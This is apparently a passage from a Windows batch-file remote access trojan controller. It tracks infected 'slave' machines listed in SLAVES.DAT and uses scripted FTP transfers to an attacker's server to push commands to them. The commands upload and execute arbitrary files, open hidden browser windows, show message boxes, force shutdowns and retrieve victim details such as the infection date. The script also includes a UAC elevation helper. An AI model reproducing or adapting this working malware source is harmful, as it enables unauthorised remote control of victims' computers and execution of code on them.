REM CLEAR ALL VARIABLES WHEN REFRESHING i.e !SLAVE_1!,2,3 etc
SET /P "COMMAND=Command: "
SET COMMAND=!COMMAND:^&=!
SET COMMAND=!COMMAND:^|=!
SET COMMAND=!COMMAND: =!
CALL :COMMAND_LIST !COMMAND!
GOTO RAT_MAIN

:GET_ADMIN
MD "%TEMP%\AdminTest" >NUL
IF ERRORLEVEL 1 GOTO GOT_ADMIN

:CREATE_ADMIN
ECHO SET UAC = CreateObject^("Shell.Application"^) > "%TEMP%\GETADMIN.VBS"
ECHO UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%TEMP%\GETADMIN.VBS"
"%TEMP%\GETADMIN.VBS"
EXIT /B

:SPACE_COUNTER
SET CHARS=%INPUT2%
SET CHAR_AMOUNT=0

:COUNT
IF DEFINED CHARS (
    SET "CHARS=%CHARS:~1%"
    SET /A CHAR_AMOUNT+=1
    GOTO COUNT
)
IF %CHAR_AMOUNT% GTR %CHAR_MAX% (
	MSG * You exceeded the amount of characters allowed.
	SET !VAR_CLEAR!=
	GOTO :EOF
)
SET /A CHAR_SPACE=%CHAR_MAX%-%CHAR_AMOUNT%
SET START=0
SET END=%CHAR_SPACE%

:SPACE_PAD
IF %START% EQU %END% GOTO PAD_DONE
SET "SPACES=!SPACES! "
SET /A START+=1
GOTO SPACE_PAD

:PAD_DONE
SET %TYPE%=1
SET "%INPUT%=!INPUT2!!SPACES!"
SET SPACES=
GOTO :EOF

:CHECK_STATUS
SET IP=%1
ECHO TEST>CHECK.CHK
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO CD !IP!
	ECHO PUT CHECK.CHK
	ECHO QUIT
)>STATUS_CHECK.CHK
FTP -n -s:STATUS_CHECK.CHK !HOST_SERVER! >NUL
DEL CHECK.CHK 2>NUL
PING -n 1.5 !HOST_SERVER! >NUL
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO CD !IP!
	ECHO GET CHECK.CHK
	ECHO DELETE CHECK.CHK
	ECHO QUIT
)>STATUS_CHECK2.CHK
FTP -n -s:STATUS_CHECK2.CHK !HOST_SERVER! >NUL
DEL STATUS_CHECK.CHK 2>NUL
DEL STATUS_CHECK2.CHK 2>NUL
IF EXIST CHECK.CHK SET "STATUS_%2=Offline" & SET COLOR_%2=1C & SET "EXTR_SPACE_%2="
IF NOT EXIST CHECK.CHK SET STATUS_%2=Online & SET COLOR_%2=1A & SET "EXTR_SPACE_%2= "
DEL CHECK.CHK 2>NUL
GOTO :EOF

:COLORTEXT
SET /P ".=." > "%~2" <NUL 
FINDSTR /V /A:%1 /R "^$" "%~2" NUL 2>NUL
SET /P ".=" <NUL
IF "%3" == "END" SET /P ".=  " <NUL
DEL "%~2" >NUL 2>NUL
EXIT /B

:HASH_ENCRYPT
SET CPX=
SET ENCRYPT_INPUT=%1
SET COUNT=0
SET STEPPING=10
:CPX_REF
SET START=0
FOR %%H IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9) DO (
	IF "%%H" == "!ENCRYPT_INPUT:~%COUNT%,1!" (
		SET /A HASH=!STEPPING:~0,1!+!STEPPING:~1,1!
		IF !HASH! GEQ 10 (
			SET /A HASH=!HASH:~0,1!+!HASH:~1,1!
		)
		SET CPX=!CPX!!HASH!
		CALL :CPX_SALT
		SET /A COUNT+=1
		SET /A START=1
	)
	IF "!START!" EQU "1" (
		SET /A STEPPING+=1
	)
)
IF "!ENCRYPT_INPUT:~%COUNT%,1!" NEQ "" (
	GOTO CPX_REF
)
SET %2=!CPX!
GOTO :EOF
:CPX_SALT
SET /A PAD=!STEPPING! %% 36
SET ALPHA=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
SET CPX=!CPX!!ALPHA:~%PAD%,1!
GOTO :EOF

:COMMAND_LIST
SET COMMAND_INPUT=%1

IF /I "!COMMAND_INPUT:~0,5!" EQU "-help" GOTO HELP_CMD
IF /I "!COMMAND_INPUT:~0,5!" EQU "-more" GOTO MORE_CMD
IF /I "!COMMAND_INPUT:~0,8!" EQU "-refresh" GOTO REFRESH_CMD
IF /I "!COMMAND_INPUT:~0,5!" EQU "-info" GOTO INFO_CMD
IF /I "!COMMAND_INPUT:~0,4!" EQU "-del" GOTO DEL_CMD
IF /I "!COMMAND_INPUT:~0,4!" EQU "-upl" GOTO UPL_CMD
IF /I "!COMMAND_INPUT:~0,4!" EQU "-url" GOTO URL_CMD
IF /I "!COMMAND_INPUT:~0,4!" EQU "-msg" GOTO MSG_CMD
IF /I "!COMMAND_INPUT:~0,4!" EQU "-shd" GOTO SHD_CMD
IF /I "!COMMAND_INPUT:~0,5!" EQU "-exit" EXIT
GOTO RAT_MAIN
:SHD_CMD
IF %1 EQU HELP (
	MSG * Usage: -shd [Number of slave] Ex: -shd 2 would shutdown slave number 2.
	GOTO RAT_MAIN
)
SET IP_SELECTED=!COMMAND_INPUT:~4,2!
SET MSG_POINT=!COMMAND_INPUT:~6!
FOR %%E IN (a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
	IF "!COMMAND_INPUT:~5,1!" EQU "%%E" (
		SET IP_SELECTED=!COMMAND_INPUT:~4,1!
		SET MSG_POINT=!COMMAND_INPUT:~5!
	) 
)
SET IP_STEP=0
SET IP=
IF !IP_SELECTED! GTR !NUMBER_OF_SLAVES! (
	GOTO INVALID_OPTION
)

FOR /F %%E IN (SLAVES.DAT) DO ( 
	IF !IP_STEP! EQU !IP_SELECTED! (
		SET IP=%%E
	)
	SET /A IP_STEP+=1
)
SET FILE_EXT=.BAT
ECHO .BAT>EXEC.FILE
ECHO Shutdown /s /f /t 00 >EXEC.BAT
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO CD !IP!
	ECHO DELETE EXEC.FILE
	ECHO DELETE EXEC!FILE_EXT!
	ECHO PUT EXEC.FILE
	ECHO PUT EXEC!FILE_EXT!
	ECHO QUIT
)>SEND_PUT.SND
FTP -n -s:SEND_PUT.SND !HOST_SERVER! >NUL
GOTO RAT_MAIN
:MSG_CMD
IF %1 EQU HELP (
	MSG * Usage: -msg [Number of slave] [Message] Ex: -msg 2 Hello would bring up a message box containing "Hello" on the slaves computer.
	GOTO RAT_MAIN
)
SET IP_SELECTED=!COMMAND_INPUT:~4,2!
SET MSG_POINT=!COMMAND_INPUT:~6!
FOR %%E IN (a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
	IF "!COMMAND_INPUT:~5,1!" EQU "%%E" (
		SET IP_SELECTED=!COMMAND_INPUT:~4,1!
		SET MSG_POINT=!COMMAND_INPUT:~5!
	) 
)
SET IP_STEP=0
SET IP=
IF !IP_SELECTED! GTR !NUMBER_OF_SLAVES! (
	GOTO INVALID_OPTION
)

FOR /F %%E IN (SLAVES.DAT) DO ( 
	IF !IP_STEP! EQU !IP_SELECTED! (
		SET IP=%%E
	)
	SET /A IP_STEP+=1
)
SET FILE_EXT=.VBS
ECHO .VBS>EXEC.FILE
ECHO MsgBox"!MSG_POINT!." , 0 + 48 , "">EXEC.VBS
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO CD !IP!
	ECHO DELETE EXEC.FILE
	ECHO DELETE EXEC!FILE_EXT!
	ECHO PUT EXEC.FILE
	ECHO PUT EXEC!FILE_EXT!
	ECHO QUIT
)>SEND_PUT.SND
FTP -n -s:SEND_PUT.SND !HOST_SERVER! >NUL
GOTO RAT_MAIN
:URL_CMD
IF %1 EQU HELP (
	MSG * Usage: -url [-h - Open hidden / -n - Open normally] [Number of slave] [Website Address] Ex: -url 2 -n www.google.com would open up google in normal mode on the slaves computer.
	GOTO RAT_MAIN
)
SET METHOD=!COMMAND_INPUT:~4,2!
SET IP_SELECTED=!COMMAND_INPUT:~6,2!
SET URL_POINT=!COMMAND_INPUT:~8!
FOR %%E IN (a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
	IF "!COMMAND_INPUT:~7,1!" EQU "%%E" (
		SET IP_SELECTED=!COMMAND_INPUT:~6,1!
		SET URL_POINT=!COMMAND_INPUT:~7!
	) 
)
SET IP_STEP=0
SET IP=
IF !IP_SELECTED! GTR !NUMBER_OF_SLAVES! (
	GOTO INVALID_OPTION
)

FOR /F %%E IN (SLAVES.DAT) DO ( 
	IF !IP_STEP! EQU !IP_SELECTED! (
		SET IP=%%E
	)
	SET /A IP_STEP+=1
)
IF "!METHOD!" EQU "-n" (
	SET FILE_EXT=.BAT
	(
		ECHO @ECHO OFF
		ECHO START !URL_POINT!
		ECHO EXIT
	)>EXEC.BAT
	ECHO .BAT>EXEC.FILE
)
IF "!METHOD!" EQU "-h" (
	SET FILE_EXT=.JS
	ECHO var WindowStyle_Hidden = 0 >EXEC.JS
	ECHO var objShell = WScript.CreateObject^("WScript.Shell"^) >>EXEC.JS
	ECHO var result = objShell.Run^("iexplore.exe !URL_POINT!", WindowStyle_Hidden^) >>EXEC.JS
	ECHO .JS>EXEC.FILE
)
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO CD !IP!
	ECHO DELETE EXEC.FILE
	ECHO DELETE EXEC!FILE_EXT!
	ECHO PUT EXEC.FILE
	ECHO PUT EXEC!FILE_EXT!
	ECHO QUIT
)>SEND_PUT.SND
FTP -n -s:SEND_PUT.SND !HOST_SERVER! >NUL
GOTO RAT_MAIN
:UPL_CMD
IF %1 EQU HELP (
	MSG * Usage: -upl [Number of slave] [Destination of file] Ex: -upl 2 C:\Windows\explorer.exe. You do not need quotes around a directory even if it has spaces in it.
	GOTO RAT_MAIN
)
SET IP_SELECTED=!COMMAND_INPUT:~4,2!
SET FILE_SELECTED=!COMMAND_INPUT:~6!
FOR %%E IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
	IF "!COMMAND_INPUT:~5,1!" EQU "%%E" (
		SET IP_SELECTED=!COMMAND_INPUT:~4,1!
		SET FILE_SELECTED=!COMMAND_INPUT:~5!
	) 
)
SET IP_STEP=0
SET IP=
IF !IP_SELECTED! GTR !NUMBER_OF_SLAVES! (
	GOTO INVALID_OPTION
)

FOR /F %%E IN (SLAVES.DAT) DO ( 
	IF !IP_STEP! EQU !IP_SELECTED! (
		SET IP=%%E
	)
	SET /A IP_STEP+=1
)
IF [!IP!]==[] GOTO INVALID_OPTION
:SEND_FILE
FOR %%A IN (!FILE_SELECTED!) DO (
	SET FILEPICKED=%%~nxA
	SET FILE_EXT=%%~xA
	ECHO %%~xA>EXEC.FILE
)
COPY /Y "!FILE_SELECTED!" "%TEMP%\EXEC!FILE_EXT!"
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO CD !IP!
	ECHO DELETE EXEC.FILE
	ECHO DELETE EXEC!FILE_EXT!
	ECHO PUT EXEC.FILE
	ECHO PUT EXEC!FILE_EXT!
	ECHO QUIT
)>SEND_PUT.SND
FTP -n -s:SEND_PUT.SND !HOST_SERVER! >NUL
GOTO RAT_MAIN
:HELP_CMD
IF %1 EQU HELP (
	MSG * Usage: -help [Command] Ex: -help -del to show the usage of -del.
	GOTO RAT_MAIN
)
CALL :!COMMAND_INPUT:~6!_CMD HELP
GOTO RAT_MAIN
REM EVERYONE !!_CMD will have a HELP section that is triggered when it is called with its %1 as HELP
:MORE_CMD
DEL LIST_OF_CMDS.BAT 2>NUL
IF %1 EQU HELP (
	MSG * Usage: -more Ex: -more to show a list of all the commands that you can use.
	GOTO :EOF
)
ECHO @ECHO OFF>LIST_OF_CMDS.BAT
ECHO MODE CON LINES=11 COLS=110>>LIST_OF_CMDS.BAT
ECHO TITLE List of commands>>LIST_OF_CMDS.BAT
ECHO COLOR 1F>>LIST_OF_CMDS.BAT
ECHO ECHO -help [command] - Use this to get more help about a specific command>>LIST_OF_CMDS.BAT
ECHO ECHO -more - Show a list of commands>>LIST_OF_CMDS.BAT
ECHO ECHO -all - Use this instead of [Number of the slave] to do to all slaves. Cannot be used for info>>LIST_OF_CMDS.BAT
ECHO ECHO -refresh - Refreshes the current status of all the slaves>>LIST_OF_CMDS.BAT
ECHO ECHO -info [Number of slave] - Provides Info about the slave>>LIST_OF_CMDS.BAT
ECHO ECHO -del [Number of slave] - Deletes and disinfects the slave(s)>>LIST_OF_CMDS.BAT
ECHO ECHO -upl [Number of slave] [Destination of file] - Allows you to upload a file to the slave(s) that>>LIST_OF_CMDS.BAT
ECHO ECHO will be executed by the slave>>LIST_OF_CMDS.BAT
ECHO ECHO -url [-h - Open hidden / -n - Open normally] [Number of slave] [Web address] - Open a web browser link>>LIST_OF_CMDS.BAT
ECHO ECHO -msg [Number of slave] - Send a message to the slave(s)>>LIST_OF_CMDS.BAT
ECHO ECHO -shd [Number of slave] - Shutdown the slave(s)>>LIST_OF_CMDS.BAT
ECHO PAUSE>>LIST_OF_CMDS.BAT
ECHO GOTO :EOF>>LIST_OF_CMDS.BAT
START LIST_OF_CMDS.BAT
GOTO RAT_MAIN
:REFRESH_CMD
IF %1 EQU HELP (
	MSG * Usage: -refresh Ex: -refresh to refresh the status off all of your slaves.
	GOTO :EOF
)
SET START=1
SET END=37
:RESET_SLAVES
IF !START! EQU !END! GOTO RAT_MAIN_LOAD
SET SLAVE_!START!=
SET /A START+=1
GOTO RESET_SLAVES

:INFO_CMD
IF %1 EQU HELP (
	MSG * Usage: -info [Number of slave] Ex: -info 4 to retrieve information about slave number 4.
	GOTO :EOF
)
DEL INFO.BAT 2>NUL
SET IP_SELECTED=!COMMAND_INPUT:~5!
SET IP_STEP=1
SET IP=
IF !IP_SELECTED! GTR !NUMBER_OF_SLAVES! (
	GOTO INVALID_OPTION
)
FOR /F %%E IN (SLAVES.DAT) DO (
	IF !IP_STEP! EQU !IP_SELECTED! (
		SET IP=%%E
	)
	SET IP_STEP+=1
)
IF [!IP!]==[] GOTO INVALID_OPTION
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO CD !IP!
	ECHO GET INFO.BAT
	ECHO QUIT
)>INFO_GET.INF
FTP -n -s:INFO_GET.INF !HOST_SERVER! >NUL
CALL INFO.BAT
(
	ECHO @ECHO OFF
	ECHO MODE CON LINES=9 COLS=41
	ECHO TITLE !IP!
	ECHO COLOR 1F
	ECHO ECHO ษออออออออออออออออออออออออออออออออออออออป
	ECHO ECHO บ               Info Box               บ
	ECHO ECHO ศออออออออออออออออออออออออออออออออออออออผ
	ECHO ECHO Computer Name: !COMPUTER_NAME!
	ECHO ECHO Username: !USER!
	ECHO ECHO Date Infected: !DATE_INFECTED!
	ECHO ECHO Time Infected: !TIME_INFECTED!
	ECHO ECHO Processor Architecture: !CPU!
	ECHO PAUSE
	ECHO GOTO :EOF
)>INFO.BAT
START INFO.BAT
GOTO RAT_MAIN
	

:DEL_CMD
IF %1 EQU HELP (
	MSG * Usage: -del [number of slave] Ex: -del 3 to remove slave number 3 or -del -all to remove all slaves.
	GOTO :EOF
)
IF !COMMAND_INPUT:~4! EQU -all (
	FOR /F %%E IN (SLAVES.DAT) DO (
		(
			ECHO USER !USERNME!
			ECHO !PASSWORD!
			ECHO BINARY
			ECHO RMDIR %%E
			ECHO QUIT
		)>DEL_ALL.DEL
		FTP -n -s:DEL_ALL.DEL !HOST_SERVER! >NUL
		DEL DEL_ALL.DEL
	)
	ECHO 0 >SLAVES.DAT
	(
		ECHO USER !USERNME!
		ECHO !PASSWORD!
		ECHO BINARY
		ECHO DELETE SLAVES.DAT
		ECHO PUT SLAVES.DAT
		ECHO QUIT
	)>SLAVES_RESET.DEL
	FTP -n -s:SLAVES_RESET.DEL !HOST_SERVER! >NUL
	DEL SLAVES_RESET.DEL
	DEL SLAVES.DAT
	GOTO REFRESH_CMD
) ELSE (
	SET IP_SELECTED=!COMMAND_INPUT:~4!
	SET IP_STEP=1
	IF !IP_SELECTED! GTR !NUMBER_OF_SLAVES! (
		GOTO INVALID_OPTION
	)
	FOR /F %%E IN (SLAVES.DAT) DO (
		SET STR=%%E
		IF !IP_STEP! EQU 1 (
			SET /A STR=!NUMBER_OF_SLAVES!-1
		)
		ECHO !STR! >> SLAVES2.DAT
		SET /A IP_STEP+=1
	)
	DEL SLAVES.DAT
	SET IP_STEP=1
	SET /A IP_SELECTED+=1
	FOR /F %%E IN (SLAVES2.DAT) DO (
		IF !IP_SELECTED! EQU !IP_STEP! (
			SET SLAVE_DELETE=%%E
			TYPE SLAVES2.DAT | FINDSTR /I /V /C:"%%E" >>SLAVES.DAT
		)
		SET /A IP_STEP+=1
	)
	DEL SLAVES2.DAT
	(
		ECHO USER !USERNME!
		ECHO !PASSWORD!
		ECHO BINARY
		ECHO CD !SLAVE_DELETE!
		ECHO DELETE INFO.BAT
		ECHO CD /
		ECHO RMDIR !SLAVE_DELETE!
		ECHO DELETE SLAVES.DAT
		ECHO PUT SLAVES.DAT
		ECHO QUIT
	)>SLAVES_RESET.DEL
	FTP -n -s:SLAVES_RESET.DEL !HOST_SERVER! >NUL
	PAUSE
	GOTO REFRESH_CMD
)
GOTO INVALID_OPTION

:INVALID_OPTION
MSG * Invalid option.
GOTO RAT_MAIN
	
